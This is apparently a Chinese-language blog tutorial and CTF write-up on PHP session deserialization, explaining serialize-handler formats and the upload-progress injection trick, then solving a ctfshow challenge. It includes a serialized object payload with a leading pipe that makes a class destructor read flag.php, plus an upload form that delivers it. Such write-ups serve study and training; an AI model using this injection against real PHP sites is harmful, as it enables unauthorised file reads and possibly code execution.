# PHP session 反序列化

[TOC]

---



## PHP session

> **PHP Session** 是一种用于在服务器端存储用户特定信息的机制，使得这些信息可以在用户访问网站的不同页面时持续可用。Session 通常用于跟踪用户的状态，比如用户的登录状态、购物车内容、偏好设置等。

### **PHP Session 的工作原理**

1. **Session 的启动**：

   - 当用户第一次访问网站时，PHP 会自动创建一个唯一的 Session ID（通常是一个长字符串）。
   - 这个 Session ID 会被发送到用户的浏览器，通常通过 Cookie 存储。

   就是当禁用cookie的时候，php也可以自动将`session id`添加到url参数中以及`form`的`hidden`字段中

2. **Session 数据的存储**：

   - 服务器端会创建一个与 Session ID 关联的文件（或存储在内存、数据库中），用于保存用户的 Session 数据。
   - 这些数据可以是任何 PHP 变量，比如数组、字符串、对象等。

3. **Session 的传递**：

   - 当用户访问其他页面时，浏览器会将 Session ID 发送回服务器。
   - 服务器根据 Session ID 找到对应的 Session 数据，并将其加载到当前页面的脚本中。

4. **Session 的销毁**：

   - 当用户关闭浏览器或 Session 过期时，Session 数据会被销毁。
   - 也可以通过 PHP 代码手动销毁 Session。

我做了一个简单的实例



### 简单的示例

登录admin/123456之后

![image-20250121165228981](https://gitee.com/bx33661/image/raw/master/path/image-20250121165228981.png)

**Session ID 是用户的唯一标识**，服务器通过它来关联用户的会话数据

可以看到PHPSEESIONID

> **Session ID** 唯一标识了服务器上的一个用户会话。每个用户的会话都有一个独立的 Session ID，服务器通过这个 ID 来关联和存储该用户的会话数据（如 `$_SESSION` 数组中的数据）。
>
> **每个用户有独立的 Session**：
>
> - 不同用户的 Session ID 是不同的，因此他们的会话数据也是独立的。
> - 例如：
>   - 用户 A 的 Session ID 是 `abc123`，对应的 Session 数据是 `$_SESSION['username'] = 'Alice'`。
>   - 用户 B 的 Session ID 是 `def456`，对应的 Session 数据是 `$_SESSION['username'] = 'Bob'`。



引擎：

| 引擎名称      | 存储格式                                                     |
| ------------- | ------------------------------------------------------------ |
| php           | 键名 + 竖线 + 经过`serialize()`函数序列化处理的值            |
| php_binary    | 键名的长度对应的 ASCII 字符 + 键名 + 经过`serialize()`函数序列化处理的值 |
| php_serialize | 经过serialize()函数序列化处理的**数组**                      |

例如：
```php
<?php
session_start();
$_SESSION['name'] = 'demo';
?>
```

```php
<?php
error_reporting(0);
ini_set('session.serialize_handler', 'php');
//ini_set('session.serialize_handler','php_binary');
//ini_set('session.serialize_handler','php_serialize');
session_start();
$_SESSION['session'] = $_GET['session'];

// 打印当前 Session 数据
echo "<pre>";
print_r($_SESSION);
echo "</pre>";
?>
```

当 **session.serialize_handler=php** 时，session文件内容为： `name|s:7:"demo";`

当 **session.serialize_handler=php_serialize** 时，session文件为： `a:1:{s:4:"name";s:7:"demo";}`

当 **session.serialize_handler=php_binary** 时，session文件内容为： `二进制字符names:7:"demo";`







**了解几个参数**：

| 参数                            | 含义                                               |
| ------------------------------- | -------------------------------------------------- |
| session.save_handler            | session保存形式。默认为files                       |
| session.save_path               | session保存路径。                                  |
| session.serialize_handler       | session序列化存储所用处理器。默认为php。           |
| session.upload_progress.cleanup | 一旦读取了所有POST数据，立即清除进度信息。默认开启 |
| session.upload_progress.enabled | 将上传文件的进度信息存在session中。默认开启。      |



### 攻击

这个是当时ryat提出的

```html
<form action =“ upload.php” method =“ POST” enctype =“ multipart / form-data”>
    <input type =“ hidden” name =“ PHP_SESSION_UPLOAD_PROGRESS” value =“ ryat” />
    <input type =“ file” name =“ file” />
    <input type =“ submit” />
</ form>
```

#### **文件上传进度跟踪**

- PHP 提供了一个功能来跟踪文件上传的进度，通过 `$_SESSION["upload_progress_<name>"]` 存储上传进度信息。

- 这个功能需要在表单中包含一个隐藏字段 `PHP_SESSION_UPLOAD_PROGRESS`，例如：

  ```
  <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="ryat" />
  ```

  运行 HTML

- 文件上传过程中，PHP 会自动将上传进度信息存储到 `$_SESSION["upload_progress_ryat"]` 中。



### BUG 原理

#### 1. **攻击者构造恶意请求**

- 攻击者通过表单上传文件，并在 `PHP_SESSION_UPLOAD_PROGRESS` 字段中注入恶意数据。

#### 2. **Session 数据注入**

- 文件上传过程中，PHP 会将上传进度信息存储到 `$_SESSION["upload_progress_ryat"]` 中。
- 由于 `PHP_SESSION_UPLOAD_PROGRESS` 的值被恶意构造，PHP 在反序列化时会将其解析为 Session 数据。
- 如果 `session.serialize_handler` 配置不一致，攻击者可以注入任意 Session 数据。

#### 3. **结果**

- 攻击者成功将恶意数据注入到 `$_SESSION` 中，可能导致：
  - 覆盖现有 Session 数据。
  - 执行任意代码（如果 Session 数据被反序列化为对象）。



## CTFSHOW-石头剪刀布

> PHP session反序列化
>
> 题目提示：
> **hint：我为啥要ini_set来着 hint2：php.ini配置的稀烂**

进入题目，题目说连着赢100回合才能得到flag

![image-20250121141634933](https://gitee.com/bx33661/image/raw/master/path/image-20250121141634933.png)

点击可以看到可以查看源代码

![image-20250121141920391](https://gitee.com/bx33661/image/raw/master/path/image-20250121141920391.png)

PHPINFO界面

![image-20250121141835906](https://gitee.com/bx33661/image/raw/master/path/image-20250121141835906.png)

结合题目提示，和源代码分析，此题应该是PHP session反序列化

利用Game类的

```php
        public function __destruct(){
                echo "<h5>Game History</h5>\n";
        echo "<div class='all_output'>\n";
                echo file_get_contents($this->log);
        echo "</div>";
        }
```

构造

```php
<?php
class Game{
    public $log;

    public function __construct(){
        $this->log = '/var/www/html/flag.php';
    }

}

$a = new Game();
echo serialize($a);
?>
```

得到的结果前面添加一个管道符号

```php
|O:4:"Game":1:{s:3:"log";s:22:"/var/www/html/flag.php";}
```

> 在服务器php_serialize处理下存储该序列化串，管道符只是一个普通的字符存放在属性值里。
>
> 而后在读取中又经过了php配置处理，这时候管道符就成了分割键名和键值的分割线了。管道符后面的内容也就被成功的反序列化了，成功达到读取flag的目的。

最后利用

一个提交页面，我们抓包利用

![image-20250121142408509](https://gitee.com/bx33661/image/raw/master/path/image-20250121142408509.png)

```html
<!doctype html>
<html>
<body>
<form action="http://793869b1-2080-446e-9066-25f43d926b25.challenge.ctf.show/" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
 <input type="file" name="file" />
    <input type="submit" />
</form>
</body>
</html>
```

修改文件名为刚才我们构造的那个结果

![image-20250121142425130](https://gitee.com/bx33661/image/raw/master/path/image-20250121142425130.png)

得到结果



## 参考文章：

- [带你走进PHP session反序列化漏洞 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/6640?time__1311=n4%2BxnD0Dg7%3DYqBK0QD%2FiWRe8mDCDcGBBilhoD#toc-5)